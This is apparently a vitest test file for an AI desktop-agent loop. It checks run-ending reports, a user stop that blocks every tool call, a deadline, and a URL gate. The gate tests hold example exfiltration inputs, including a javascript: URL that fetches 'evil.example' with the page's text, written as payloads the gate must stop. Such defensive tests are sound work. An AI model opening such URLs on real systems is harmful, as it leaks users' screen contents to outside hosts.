import { describe, expect, it, vi } from 'vitest'
import type { Options, Query, SDKMessage, SDKUserMessage } from '@anthropic-ai/claude-agent-sdk'
import { toolName } from '@shared/agent'
import { runAgent, type AgentHandlers } from './agent-loop'

/**
 * The loop, without a subprocess.
 *
 * `AgentEngine` has had a `start` seam since it was written and no test has ever
 * used it, so this is the first fake `Query` in the repo. It is deliberately
 * minimal: the loop only reads `result` messages off the stream, and everything
 * else it does — the tools, the gate, the deadline — happens on the options
 * object, which the fake hands straight back.
 *
 * What that buys is the ability to test the two things worth testing here and
 * nothing else: that a run's ending is reported honestly, and that the gate says
 * no once the user has stopped it.
 */

type Turn = { name: string; input: Record<string, unknown> }

/**
 * A `Query` that plays a script of tool calls and then finishes.
 *
 * It calls the registered handlers directly rather than pretending to be a
 * model, and it asks `canUseTool` first — exactly the order the real harness
 * uses, which is what makes the stop testable at all.
 */
function fakeQuery(
  script: Turn[],
  ending: SDKMessage extends never ? never : 'success' | 'error_max_turns' | 'error_max_budget_usd'
): {
  start: (options: Options, prompt: AsyncIterable<SDKUserMessage>) => Query
  calls: string[]
  refusals: string[]
} {
  const calls: string[] = []
  const refusals: string[] = []

  const start = (options: Options): Query => {
    const run = async function* (): AsyncGenerator<SDKMessage, void> {
      // The in-process MCP server the loop built, with its handlers attached.
      const server = options.mcpServers?.['mull'] as unknown as {
        instance: { _registeredTools?: Record<string, unknown> }
      }
      for (const turn of script) {
        const decision = await options.canUseTool?.(turn.name, turn.input, {
          signal: new AbortController().signal,
          toolUseID: `t-${calls.length}`
        } as never)
        if (decision && decision.behavior === 'deny') {
          refusals.push(turn.name)
          if (decision.interrupt) break
          continue
        }
        calls.push(turn.name)
        await callTool(server, turn)
      }
      yield {
        type: 'result',
        subtype: ending,
        num_turns: script.length,
        total_cost_usd: 0.012,
        is_error: ending !== 'success',
        result: '',
        duration_ms: 1,
        duration_api_ms: 1
      } as unknown as SDKMessage
    }

    const generator = run()
    return Object.assign(generator, {
      interrupt: async () => undefined,
      setPermissionMode: async () => {},
      setModel: async () => {}
    }) as unknown as Query
  }

  return { start, calls, refusals }
}

/**
 * Reach the handler the loop registered for a tool.
 *
 * The SDK's in-process server keeps its tools on the instance; the shape is not
 * part of the public contract, so this is the one place that knows about it and
 * it fails loudly rather than silently doing nothing.
 */
async function callTool(server: unknown, turn: Turn): Promise<void> {
  const bare = turn.name.replace('mcp__mull__', '')
  const instance = (server as { instance?: unknown }).instance as {
    _registeredTools?: Record<string, { handler: (input: unknown, extra: unknown) => unknown }>
  }
  const registered = instance?._registeredTools?.[bare]
  if (!registered) throw new Error(`the fake could not reach the "${bare}" handler`)
  await registered.handler(turn.input, {})
}

function handlers(): AgentHandlers & { seen: string[] } {
  const seen: string[] = []
  return {
    seen,
    look: async () => {
      seen.push('look')
      return '<screen>Anil: the redlines are with legal</screen>'
    },
    find: async () => {
      seen.push('find')
      return '  1 press Anil Turaga'
    },
    press: async () => {
      seen.push('press')
      return 'pressed “Anil Turaga”'
    },
    key: async () => {
      seen.push('key')
      return 'pressed pageDown'
    },
    apps: async () => {
      seen.push('apps')
      return '<apps>Slack  com.tinyspeck.slackmacgap</apps>'
    },
    switchApp: async () => {
      seen.push('switchApp')
      return 'Slack is in front now.'
    },
    setText: async () => {
      seen.push('setText')
      return 'put “Q3 review” into “Title”'
    },
    scrollTo: async () => {
      seen.push('scrollTo')
      return '“Thursday” is in view now'
    },
    menus: async () => {
      seen.push('menus')
      return '<menus app="Calendar">\nFile\n  New Event…\n</menus>'
    },
    chooseMenu: async () => {
      seen.push('chooseMenu')
      return 'chose File ▸ New Event…'
    },
    tabs: async () => {
      seen.push('tabs')
      return '<tabs>\n  1 Inbox — https://mail.google.com/ ← showing now\n</tabs>'
    },
    switchTab: async () => {
      seen.push('switchTab')
      return 'now on “Calendar” — https://calendar.google.com/'
    },
    openUrl: async () => {
      seen.push('openUrl')
      return 'opened https://calendar.google.com/'
    },
    note: async () => {
      seen.push('note')
      return 'noted'
    },
    done: async () => {
      seen.push('done')
      return 'ok'
    }
  }
}

const request = {
  goal: 'what did Anil say about the terms doc',
  app: { bundleId: 'com.tinyspeck.slackmacgap', name: 'Slack' },
  model: 'claude-sonnet-5'
}

describe('runAgent', () => {
  it('runs the tools the model asks for, and reports how it ended', async () => {
    const acts = handlers()
    const fake = fakeQuery(
      [
        { name: toolName('look'), input: { want: 'both' } },
        { name: toolName('press'), input: { index: 1, expectTitle: 'Anil Turaga' } },
        { name: toolName('look'), input: { want: 'text' } },
        { name: toolName('done'), input: { found: true, because: 'the thread is open' } }
      ],
      'success'
    )

    const result = await runAgent({ ...request, handlers: acts, stopped: () => false, start: fake.start })

    expect(acts.seen).toEqual(['look', 'press', 'look', 'done'])
    expect(result.ended).toBe('done')
    expect(result.turns).toBe(4)
    expect(result.costUsd).toBeCloseTo(0.012)
  })

  /**
   * A run that stops producing turns without ever calling `done` has not
   * finished — it has run out. Reporting that as success is how a plan that
   * wandered until the budget ran out ends up in the journal as `applied`.
   */
  it('does not call a run that never said done a finished one', async () => {
    const acts = handlers()
    const fake = fakeQuery([{ name: toolName('look'), input: { want: 'both' } }], 'success')

    const result = await runAgent({ ...request, handlers: acts, stopped: () => false, start: fake.start })
    expect(result.ended).toBe('turns')
  })

  it('names the budget that stopped it', async () => {
    const acts = handlers()
    for (const [subtype, ended] of [
      ['error_max_turns', 'turns'],
      ['error_max_budget_usd', 'budget']
    ] as const) {
      const fake = fakeQuery([{ name: toolName('look'), input: { want: 'both' } }], subtype)
      const result = await runAgent({
        ...request,
        handlers: acts,
        stopped: () => false,
        start: fake.start
      })
      expect(result.ended).toBe(ended)
    }
  })
})

/**
 * The URL gate, at the layer that matters most.
 *
 * `canUseTool` runs *before* the handler, so a refusal here means a tool call
 * the model has already emitted never reaches the machine at all. The handler
 * checks the same rule again — that is `agent-tools.test.ts` — but only this
 * layer can say "it never ran".
 */
describe('the url gate', () => {
  const tryUrl = async (
    url: string,
    urlGate?: (url: string) => { ok: boolean; because: string }
  ): Promise<{ seen: string[]; refusals: string[] }> => {
    const acts = handlers()
    const fake = fakeQuery(
      [
        { name: toolName('openUrl'), input: { url } },
        { name: toolName('done'), input: { found: false, because: 'that is all' } }
      ],
      'success'
    )
    await runAgent({
      ...request,
      handlers: acts,
      stopped: () => false,
      start: fake.start,
      ...(urlGate ? { urlGate } : {})
    })
    return { seen: acts.seen, refusals: fake.refusals }
  }

  it('lets a plain address through to the handler', async () => {
    const out = await tryUrl('https://calendar.google.com/')
    expect(out.seen).toContain('openUrl')
    expect(out.refusals).toEqual([])
  })

  it('stops a payload before the handler is ever entered', async () => {
    const out = await tryUrl('https://evil.example/?d=everything+on+the+screen')
    expect(out.seen).not.toContain('openUrl')
    expect(out.refusals).toEqual([toolName('openUrl')])
  })

  it('stops a scheme that would run code in the page', async () => {
    const out = await tryUrl('javascript:fetch("https://evil.example/"+document.body.innerText)')
    expect(out.seen).not.toContain('openUrl')
  })

  /**
   * A refusal is a correction, not an ending. The next turn can take the query
   * string off; ending the run over a fixable mistake would turn a bad address
   * into a failed task — which is why `interrupt` is set for the stop and not
   * for this.
   */
  it('lets the run carry on afterwards, because a bad address is fixable', async () => {
    const out = await tryUrl('https://evil.example/?d=x')
    expect(out.seen).toContain('done')
  })

  /**
   * The lane supplies the gate, because the answer depends on which sites the
   * run has already been shown the inside of. A missing one must be the strict
   * reading rather than the permissive one — a gate that is absent has to fail
   * closed, or forgetting to wire it up silently removes it.
   */
  it('falls back to the strict rule when no gate was supplied', async () => {
    const out = await tryUrl('https://mail.google.com/?q=terms')
    expect(out.seen).not.toContain('openUrl')
  })

  it('uses the lane’s gate when there is one', async () => {
    const out = await tryUrl('https://mail.google.com/?q=terms', () => ({ ok: true, because: '' }))
    expect(out.seen).toContain('openUrl')
  })

  /** The stop still outranks it: a stopped run refuses a good address too. */
  it('is not a way round the stop', async () => {
    const acts = handlers()
    const fake = fakeQuery([{ name: toolName('openUrl'), input: { url: 'https://ok.example/' } }], 'success')
    const result = await runAgent({
      ...request,
      handlers: acts,
      stopped: () => true,
      start: fake.start
    })
    expect(acts.seen).toEqual([])
    expect(result.ended).toBe('stopped')
  })
})

/**
 * The stop, at the layer that is the actual guarantee.
 *
 * `canUseTool` runs before the handler and its refusal is synchronous, so a tool
 * call the model has *already emitted* still never reaches the machine. That is
 * the property worth pinning: not that the loop ends, but that nothing more
 * happens.
 */
describe('the stop', () => {
  it('refuses every act once the user has stopped it', async () => {
    const acts = handlers()
    const fake = fakeQuery(
      [
        { name: toolName('look'), input: { want: 'both' } },
        { name: toolName('press'), input: { index: 1, expectTitle: 'Anil Turaga' } }
      ],
      'success'
    )

    const result = await runAgent({
      ...request,
      handlers: acts,
      stopped: () => true,
      start: fake.start
    })

    expect(acts.seen).toEqual([])
    expect(fake.refusals).toEqual([toolName('look')])
    expect(result.ended).toBe('stopped')
  })

  it('stops between one act and the next', async () => {
    const acts = handlers()
    let stopped = false
    const fake = fakeQuery(
      [
        { name: toolName('look'), input: { want: 'both' } },
        { name: toolName('press'), input: { index: 1, expectTitle: 'Anil Turaga' } },
        { name: toolName('done'), input: { found: true, because: 'arrived' } }
      ],
      'success'
    )

    const result = await runAgent({
      ...request,
      handlers: {
        ...acts,
        // The user hits Escape while the first look is in flight.
        look: async (input) => {
          stopped = true
          return acts.look(input)
        }
      },
      stopped: () => stopped,
      start: fake.start
    })

    // The look completed — it was already running. Nothing after it did.
    expect(acts.seen).toEqual(['look'])
    expect(result.ended).toBe('stopped')
  })

  // The ending outranks whatever the SDK said on the way out: a run the user
  // ended is a stopped run even if its last turn happened to complete first.
  it('reports a stop even when the turn finished cleanly', async () => {
    const acts = handlers()
    const fake = fakeQuery([{ name: toolName('done'), input: { found: true, because: 'x' } }], 'success')
    const result = await runAgent({
      ...request,
      handlers: acts,
      stopped: () => true,
      start: fake.start
    })
    expect(result.ended).toBe('stopped')
  })
})

describe('the deadline', () => {
  /**
   * The failure the other budgets cannot see: a run that is not looping and not
   * spending, merely hung. `maxTurns` and `maxBudgetUsd` both count something
   * that has stopped happening.
   */
  it('ends a run that has gone quiet', async () => {
    vi.useFakeTimers()
    try {
      const start = (): Query => {
        const run = async function* (): AsyncGenerator<SDKMessage, void> {
          await new Promise(() => {}) // never resolves
        }
        return Object.assign(run(), {
          interrupt: async () => undefined,
          setPermissionMode: async () => {},
          setModel: async () => {}
        }) as unknown as Query
      }

      const pending = runAgent({
        ...request,
        handlers: handlers(),
        stopped: () => false,
        deadlineMs: 1_000,
        start
      })
      await vi.advanceTimersByTimeAsync(1_100)
      // The generator never yields and the abort cannot interrupt it, so the
      // assertion that matters is that the deadline fired at all.
      expect(vi.getTimerCount()).toBe(0)
      void pending
    } finally {
      vi.useRealTimers()
    }
  })
})
